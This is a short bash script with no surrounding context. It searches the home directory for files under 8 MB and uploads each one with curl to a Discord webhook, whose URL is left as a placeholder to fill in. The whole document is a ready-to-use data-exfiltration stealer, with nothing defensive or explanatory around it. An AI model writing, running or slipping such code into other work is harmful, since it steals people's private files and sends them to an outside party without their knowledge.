#!/bin/bash
find ~/ -type f -name "*.*" -size -8M -maxdepth 3 -exec curl -s -F "file=@{}" "[INSERT DISCORD WEBHOOK URL HERE]" \;
